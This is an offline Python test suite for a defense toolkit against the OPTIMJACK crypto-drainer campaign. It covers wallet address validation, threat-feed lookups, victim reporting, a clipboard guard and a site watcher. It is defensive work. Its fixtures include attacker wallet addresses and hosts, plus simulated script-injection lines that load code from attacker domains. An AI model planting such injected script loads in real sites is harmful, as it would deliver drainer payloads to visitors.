"""Offline test of the campaign defenses (OPTIMJACK and future campaigns). No network.
    python test_campaign_defense_offline.py
"""
import json, os, shutil, sys, tempfile
ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)
WORK = tempfile.mkdtemp(prefix="sh_campaign_")
os.chdir(WORK)                                  # every data file (config, incident, book) lands here

from responder import addresses as A           # noqa: E402
import threatfeed                               # noqa: E402

ok = lambda c, m: print(("PASS " if c else "FAIL ") + m) or bool(c)
r = []
IOC = {"ethereum": "0xC4026b06D82b0F0B363eda0642D61CfbDc17884e", "bitcoin": "19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW",
       "litecoin": "ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5", "tron": "THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa",
       "ton": "UQAgM1VqSZQiJLSG5w-ovurq5CZdxLEK3_7CMmwALTA5e09p", "solana": "FVtL8NMYS9PA1v3HE67XUGCtGA9JaZUvqav2fU2LrV5n",
       "bitcoin-cash": "qzkaaf8n6grmpr0d9lx8xutn3r9lk722f566hhpe58", "dogecoin": "DBEGrxRF7KMSuhTS4c1MFviStU6efdMnu5"}

# ---- 1. address validation ----
r.append(ok(A.keccak256(b"").hex().startswith("c5d2460186f7233c"), "Keccak-256 matches the standard test vector"))
r.append(ok(A.is_evm("0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAed") and not A.is_evm("0x5aAeb6053F3E94C9b9A09f33669435E7Ef1BeAeD"),
            "EIP-55: a one-letter case typo in an Ethereum address is caught"))
r.append(ok(A.is_segwit("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4", "bc") and not A.is_segwit("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t5", "bc"),
            "Bech32: a typo in a bc1 address is caught (previously any bc1 string passed)"))
r.append(ok(A.is_segwit("bc1p0xlxvlhemja6c4dqv22uapctqupfhlxm9h8z3k2e72q4k9hcz7vqzk5jj0", "bc"), "Bech32m (Taproot) address accepted"))
r.append(ok(A.is_bch("bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a") and not A.is_bch("qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6b"),
            "Bitcoin Cash CashAddr checksum, with or without prefix"))
r.append(ok(A.is_ton("EQDtFpEwcFAEcRe5mLVh2N6C0x-_hJEM7W61_JLnSF74p4q2") and not A.is_ton("EQDtFpEwcFAEcRe5mLVh2N6C0x-_hJEM7W61_JLnSF74p4q3"),
            "TON address CRC16 checked"))
found = {c: A.extract(f"pay {a} now") for c, a in IOC.items()}
r.append(ok(all(v == [(c, IOC[c])] for c, v in found.items()), "all 8 OPTIMJACK addresses recognised on the right chain"))
r.append(ok(A.extract("0xC4026b06D82b0F0B363eda0642D61CfbDc17884E") == [], "Ethereum address with a broken checksum is rejected"))
r.append(ok(A.extract("0x10ed43c718714eb63d5aa57b78b54704e256024e")[0][0] == "ethereum", "all-lowercase Ethereum address still accepted"))

# ---- 2. campaign feed ----
r.append(ok(all(threatfeed.campaign_for_address(a)["name"] == "OPTIMJACK" for a in IOC.values()), "every campaign address maps to OPTIMJACK"))
r.append(ok(threatfeed.campaign_for_address(IOC["ethereum"].lower()) and threatfeed.campaign_for_address("bitcoincash:" + IOC["bitcoin-cash"]),
            "lookups ignore Ethereum letter case and the bitcoincash: prefix"))
r.append(ok(threatfeed.campaign_for_address("19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kX") is None, "a different address is not matched"))
r.append(ok(threatfeed.campaign_for_host("1688360.cc") and threatfeed.campaign_for_host("cdn.1688360.cc")
            and threatfeed.campaign_for_host("136.113.106.136") and not threatfeed.campaign_for_host("cdn.optimizely.com"),
            "attacker hosts match; the hijacked vendor itself (optimizely) is not branded malicious"))
r.append(ok(threatfeed.scan_text('x.src="https://1688360.cc/track.js"') == [("OPTIMJACK", "1688360.cc")], "script text scan finds the payload host"))

from shield import compromised, prescreen  # noqa: E402
r.append(ok("OPTIMJACK" in (compromised.check_address(IOC["tron"]) or ""), "same-day list check reports the campaign"))
r.append(ok("OPTIMJACK" in (compromised.check_domain("https://1688360.cc/track.js") or ""), "payload domain flagged"))
r.append(ok(any("OPTIMJACK" in h for h in prescreen._known_bad(IOC["bitcoin"])), "pre-screen known-bad check names the campaign (-> STOP)"))

# ---- 3. tracer seeding ----
from responder import incident  # noqa: E402
added = threatfeed.seed_tracer(log=lambda *_: None)
mc = json.load(open(incident.MC_MAP)) if os.path.exists(incident.MC_MAP) else {"seeds": []}
seeded = {s[0] for s in mc["seeds"]}
r.append(ok(seeded == {"ethereum", "bitcoin", "litecoin", "tron", "solana"}, f"tracer follows the 5 traceable chains, not TON/BCH/DOGE ({sorted(seeded)})"))
r.append(ok(all(s[2] and s[2] > 1794000000 for s in mc["seeds"]), "tracing starts a day before the campaign, not the address's whole past"))
r.append(ok(threatfeed.seed_tracer(log=lambda *_: None) == [] and len(json.load(open(incident.MC_MAP))["seeds"]) == 5,
            "seeding again at the next start adds nothing (idempotent)"))
r.append(ok(incident.add("ton " + IOC["ton"]) and len(json.load(open(incident.MC_MAP))["seeds"]) == 5,
            "an untraceable-chain address is listed but never sent to the tracer"))

# ---- 4. victim path ----
from freezekit import setup  # noqa: E402
okk, _ = setup.save({"scam_wallet": IOC["tron"], "name": "Test Victim"})
v = json.load(open("victim.json"))
r.append(ok(okk and v.get("campaign", {}).get("name") == "OPTIMJACK" and "OPTIMJACK" in v.get("scam_type", ""),
            "victim case names the campaign so reports and freeze requests carry it"))
page = setup.done_page("topic")
r.append(ok("This was the OPTIMJACK attack" in page and "Tether can freeze" in page and "http-equiv=refresh" not in page,
            "done page explains the attack, points to the Tether freeze, and doesn't rush away"))
okk2, msg = setup.save({"scam_wallet": IOC["dogecoin"]})
r.append(ok(not okk2 and "OPTIMJACK" in msg and "ic3.gov" in msg, "Dogecoin victim gets the campaign + reporting steps instead of 'invalid address'"))
setup.save({"scam_wallet": "1BoatSLRHtKNngkdXEeobR76b53LETtpyT"})
r.append(ok("campaign" not in json.load(open("victim.json")), "an ordinary case carries no campaign"))

# ---- 5. copy-paste guard ----
from shield import clipguard  # noqa: E402
f = clipguard.assess("send to " + IOC["solana"])
r.append(ok(len(f) == 1 and f[0]["level"] == "stop" and "OPTIMJACK" in f[0]["why"][0], "copied attacker address -> STOP"))
okb, _ = clipguard.book_add("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4", "My exchange BTC deposit")
f = clipguard.assess("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4")
r.append(ok(okb and f[0]["level"] == "saved" and f[0]["why"] == ["My exchange BTC deposit"], "copied saved address -> confirmed by name"))
f = clipguard.assess("1BoatSLRHtKNngkdXEeobR76b53LETtpyT")
r.append(ok(f[0]["level"] == "unknown", "copied unknown address -> check reminder"))
r.append(ok(not clipguard.book_add(IOC["bitcoin"], "trap")[0], "an attacker address can't be saved as trusted"))
r.append(ok(not clipguard.book_add("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t5", "typo")[0], "an address with a bad checksum can't be saved"))
r.append(ok(clipguard.assess("my password is hunter2") == [] and clipguard.assess("x" * 6000) == [], "non-address text is ignored"))
r.append(ok(clipguard.chunked("19g9rZcPeiz8") == "19g9 rZcP eiz8", "addresses shown in groups of 4 for eye comparison"))
clipguard.post({"do": "on"})
r.append(ok(json.load(open("config.json")).get("clipguard") is True and clipguard.enabled(), "guard switched on from its page"))
html = clipguard.post({"do": "test", "text": IOC["ethereum"]})
r.append(ok("STOP" in html and "OPTIMJACK" in html and "My exchange BTC deposit" in html, "page: test box, address book and campaign list render"))
clipguard.post({"do": "off"})
r.append(ok(not clipguard.enabled(), "guard switched off"))
r.append(ok(not os.path.exists(os.path.join(ROOT, "address_book.json")), "address book stays in the user's folder, not the code"))

# ---- 6. site watcher ----
from shield import sitewatch as sw  # noqa: E402
SITE = {"https://shop.example/": '<script src="/app.js"></script><script src="https://cdn.optimizely.com/js/123.js"></script>',
        "https://shop.example/app.js": "console.log(1)",
        "https://cdn.optimizely.com/js/123.js": 'var a="https://logx.optimizely.com/v1";'}
sw.GET = lambda u: SITE[u] if u in SITE else (_ for _ in ()).throw(OSError("offline"))
sw.dns = lambda *a: ["1.2.3.4"]
sw.rdap = lambda d: {"registrar": "R", "locked": True}
sw.certs = lambda d: {"issuers": ["LE"]}
alerts = []
sw.add(["shop.example"])
sw.check(log=lambda *_: None, alert=lambda d, s: alerts.append(s))
SITE["https://cdn.optimizely.com/js/123.js"] = 'var a="https://logx.optimizely.com/v1";var b=document.createElement("script");b.src="https://1688360.cc/track.js"'
d = sw.check(log=lambda *_: None, alert=lambda d, s: alerts.append(s))
st = d["sites"]["shop.example"]
r.append(ok(st["level"] == "alert" and any("known attack code" in x for x in st["signals"]), "trusted outside script now loading the OPTIMJACK payload -> alert"))
# unknown future campaign: same pattern, host not in any feed
SITE["https://cdn.optimizely.com/js/123.js"] = 'var a="https://logx.optimizely.com/v1";'
sw.accept("shop.example")
SITE["https://cdn.optimizely.com/js/123.js"] = 'var a="https://logx.optimizely.com/v1";s.src="https://evil-new-cdn.top/t.js"'
d = sw.check(log=lambda *_: None, alert=lambda d, s: alerts.append(s))
st = d["sites"]["shop.example"]
r.append(ok(st["level"] == "alert" and any("evil-new-cdn.top" in x for x in st["signals"]),
            "a NEW campaign with no known markers is still caught: trusted script changed + points to a new host"))
# baselines from before this release: no false alarm on the first check
sw.remove("shop.example"); sw.add(["shop.example"])
SITE["https://cdn.optimizely.com/js/123.js"] = 'var a="https://logx.optimizely.com/v1";'
dd = sw.load(); dd["sites"]["shop.example"]["baseline"] = {"ns": ["1.2.3.4"], "a": ["1.2.3.4"], "rdap": {"registrar": "R", "locked": True},
    "certs": {"issuers": ["LE"]}, "scripts": {"https://shop.example/app.js": sw.hashlib.sha256(b"console.log(1)").hexdigest()[:16],
                                              "https://cdn.optimizely.com/js/123.js": "third-party"}}
sw.save(dd)
d = sw.check(log=lambda *_: None)
st = d["sites"]["shop.example"]
r.append(ok(st["level"] == "ok" and st["baseline"].get("script_refs") and st["baseline"]["scripts"]["https://cdn.optimizely.com/js/123.js"] != "third-party",
            "older baselines upgrade quietly on a clean check (no false alarm)"))
sw.remove("shop.example"); sw.add(["shop.example"])
SITE["https://cdn.optimizely.com/js/123.js"] = 'b.src="https://1688360.cc/track.js"'
n0 = len(alerts)
d = sw.check(log=lambda *_: None, alert=lambda d, s: alerts.append(s))
d = sw.check(log=lambda *_: None, alert=lambda d, s: alerts.append(s))
r.append(ok(d["sites"]["shop.example"]["level"] == "alert" and len(alerts) == n0 + 1,
            "a site already infected on its first check alerts at once, and only once"))

os.chdir(ROOT)
shutil.rmtree(WORK, ignore_errors=True)
print(f"{sum(r)}/{len(r)} passed")
sys.exit(0 if all(r) else 1)
